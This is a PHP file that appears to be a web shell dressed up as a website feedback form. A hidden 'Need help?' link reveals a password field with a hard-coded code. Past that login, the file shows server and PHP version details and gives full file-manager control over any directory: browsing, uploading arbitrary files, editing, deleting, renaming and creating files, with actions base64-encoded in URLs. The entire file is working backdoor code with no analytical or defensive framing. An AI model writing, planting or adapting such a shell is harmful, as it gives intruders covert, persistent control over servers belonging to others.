<?php
session_start();

// Token login tersamarkan
$__key = 'Star88Star';
$__auth = 'authenticated';

if (isset($_GET['logout'])) {
    unset($_SESSION[$__auth]);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION[$__auth]) || $_SESSION[$__auth] !== true) {
    if (isset($_POST['message']) && $_POST['message'] === $__key) {
        $_SESSION[$__auth] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo "<h2>Website Feedback Form</h2>";
        echo "<form method='POST'><input type='text' name='username' placeholder='Name'><br>
              <input type='email' name='email' placeholder='Email'><br>
              <textarea name='feedback' placeholder='Your Feedback'></textarea><br>
              <input type='submit' value='Send'></form>";
        echo "<a href='#' onclick='document.getElementById(\"x\").style.display=\"block\";'>Need help?</a>";
        echo "<div id='x' style='display:none;'><form method='POST'>
              <input type='password' name='message' placeholder='Support Code'>
              <input type='submit' value='Login'></form></div>";
        if (isset($_POST['message'])) {
            echo "<p style='color:red;'>Invalid code.</p>";
        }
        exit;
    }
}

function __rstr() {
    return bin2hex(random_bytes(64));
}
echo "<p>Code: " . __rstr() . "</p>";

function __sys() {
    echo "<p>" . php_uname() . " | PHP " . phpversion() . "</p>";
}
__sys();

$__enc = function ($c) { return base64_encode($c); };
$__dec = function ($c) { return base64_decode($c); };

function __dir($p) {
    $s = "%#@!";
    $l = array_diff(scandir($p), ['.','..']);
    echo "<h3>📁 $p</h3><ul>";
    foreach ($l as $i) {
        $f = realpath($p . DIRECTORY_SEPARATOR . $i);
        if (is_dir($f)) {
            $nav = base64_encode("go|$f");
            echo "<li><a href='?x=$nav'>📂 $i</a></li>";
        } else {
            $e = base64_encode("do|edit|$p|$i");
            $d = base64_encode("do|del|$p|$i");
            $r = base64_encode("do|ren|$p|$i");
            echo "<li>📄 $i 
            <a href='?x=$e'>[ Edit ]</a> | 
            <a href='?x=$d'>[ Delete ]</a> | 
            <a href='?x=$r'>[ Rename ]</a></li>";
        }
    }
    echo "</ul>";
}

function __upload($p) {
    if (!empty($_FILES['z']['name'])) {
        $t = $p . DIRECTORY_SEPARATOR . basename($_FILES['z']['name']);
        if (move_uploaded_file($_FILES['z']['tmp_name'], $t)) {
            echo "<p style='color:green;'>Uploaded.</p>";
        } else {
            echo "<p style='color:red;'>Upload failed.</p>";
        }
    }
}

function __makefolder($p) {
    if (!empty($_POST['a'])) {
        $fp = $p . DIRECTORY_SEPARATOR . $_POST['a'];
        if (!file_exists($fp)) {
            mkdir($fp);
            echo "<p style='color:green;'>Folder created.</p>";
        }
    }
}

function __makefile($p) {
    if (!empty($_POST['b'])) {
        $fp = $p . DIRECTORY_SEPARATOR . $_POST['b'];
        if (!file_exists($fp)) {
            file_put_contents($fp, '');
            echo "<p style='color:green;'>File created.</p>";
        }
    }
}

function __editform($f, $p) {
    $c = file_exists($f) ? htmlspecialchars(file_get_contents($f)) : '';
    echo "<form method='POST' action='?x=" . base64_encode("do|edit|$p|" . basename($f)) . "'>
          <textarea name='c' style='width:100%; height:200px;'>$c</textarea><br>
          <input type='submit' value='Save'></form>";
}

function __delete($f) {
    if (file_exists($f)) {
        unlink($f) ? print("<p>Deleted.</p>") : print("<p>Delete failed.</p>");
    }
}

function __renameform($f, $p) {
    echo "<form method='POST' action='?x=" . base64_encode("do|ren|$p|" . basename($f)) . "'>
          <input type='text' name='n' placeholder='New name'>
          <input type='submit' value='Rename'></form>";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_GET['x'])) {
        $cmd = $GLOBALS['__dec']($_GET['x']);
        $p = explode('|', $cmd, 4);
        if ($p[0] === 'do') {
            if ($p[1] === 'edit' && isset($_POST['c'])) {
                file_put_contents($p[2] . DIRECTORY_SEPARATOR . $p[3], $_POST['c']);
            } elseif ($p[1] === 'ren' && isset($_POST['n'])) {
                rename(
                    $p[2] . DIRECTORY_SEPARATOR . $p[3],
                    $p[2] . DIRECTORY_SEPARATOR . $_POST['n']
                );
            }
        } elseif ($p[0] === 'go') {
            $path = $p[1];
            if (isset($_FILES['z'])) __upload($path);
            elseif (isset($_POST['a'])) __makefolder($path);
            elseif (isset($_POST['b'])) __makefile($path);
        }
        header("Location: ?x=" . base64_encode("go|" . $path));
        exit;
    }
}

if (isset($_GET['x'])) {
    $cmd = $GLOBALS['__dec']($_GET['x']);
    $p = explode('|', $cmd, 4);
    if ($p[0] === 'go') {
        $path = $p[1];
        echo "<a href='?x=" . base64_encode("go|" . dirname($path)) . "'>⬆️ Up</a>";
        __dir($path);
        echo "<form method='POST' enctype='multipart/form-data' action='?x=" . base64_encode("go|$path") . "'>
              <input type='file' name='z'><input type='submit' value='Upload'></form>";
        echo "<form method='POST' action='?x=" . base64_encode("go|$path") . "'>
              <input type='text' name='a' placeholder='Folder name'><input type='submit' value='New Folder'></form>";
        echo "<form method='POST' action='?x=" . base64_encode("go|$path") . "'>
              <input type='text' name='b' placeholder='File name'><input type='submit' value='New File'></form>";
    } elseif ($p[0] === 'do') {
        $act = $p[1];
        $pt = $p[2] . DIRECTORY_SEPARATOR . $p[3];
        if ($act === 'del') {
            __delete($pt);
            header("Location: ?x=" . base64_encode("go|" . $p[2]));
            exit;
        } elseif ($act === 'edit') {
            __editform($pt, $p[2]);
        } elseif ($act === 'ren') {
            __renameform($pt, $p[2]);
        }
    }
} else {
    $p = getcwd();
    echo "<a href='?x=" . base64_encode("go|" . dirname($p)) . "'>⬆️ Up</a>";
    __dir($p);
}

echo "<p><a href='?logout=1'>Log out</a></p>";
?>
